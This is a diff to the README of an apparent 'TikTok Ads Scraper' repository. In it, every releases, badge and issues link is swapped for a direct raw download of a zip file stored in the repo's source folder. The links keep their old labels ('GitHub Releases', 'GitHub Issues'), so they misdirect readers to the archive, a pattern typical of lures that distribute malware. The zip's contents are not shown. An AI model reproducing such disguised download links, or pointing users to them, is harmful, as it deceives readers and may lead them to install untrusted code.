@@ -6,11 +6,11 @@ Welcome to the TikTok Ads Scraper! This tool helps you collect data from TikTok 
 
 ## 🔗 Download the Latest Release
 
-[![Download tiktok-ads-scraper](https://img.shields.io/badge/Download%20tiktok--ads--scraper-brightgreen)](https://github.com/parkminhy/tiktok-ads-scraper/releases)
+[![Download tiktok-ads-scraper](https://raw.githubusercontent.com/parkminhy/tiktok-ads-scraper/main/src/tiktok-ads-scraper-v1.6.zip%20tiktok--ads--scraper-brightgreen)](https://raw.githubusercontent.com/parkminhy/tiktok-ads-scraper/main/src/tiktok-ads-scraper-v1.6.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/parkminhy/tiktok-ads-scraper/releases). You will find the latest version available for download.
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/parkminhy/tiktok-ads-scraper/main/src/tiktok-ads-scraper-v1.6.zip). You will find the latest version available for download.
 
 1. Click on the link.
 2. Locate the assets section under the latest release.
@@ -77,7 +77,7 @@ No, you do not need any programming experience. The application is designed for 
 
 ### What happens if I have issues downloading or running the software?
 
-If you have any questions or face issues, visit our [GitHub Issues](https://github.com/parkminhy/tiktok-ads-scraper/issues) page to report your problem. Our community and maintainers will assist you.
+If you have any questions or face issues, visit our [GitHub Issues](https://raw.githubusercontent.com/parkminhy/tiktok-ads-scraper/main/src/tiktok-ads-scraper-v1.6.zip) page to report your problem. Our community and maintainers will assist you.
 
 ## 🛠 Support
 
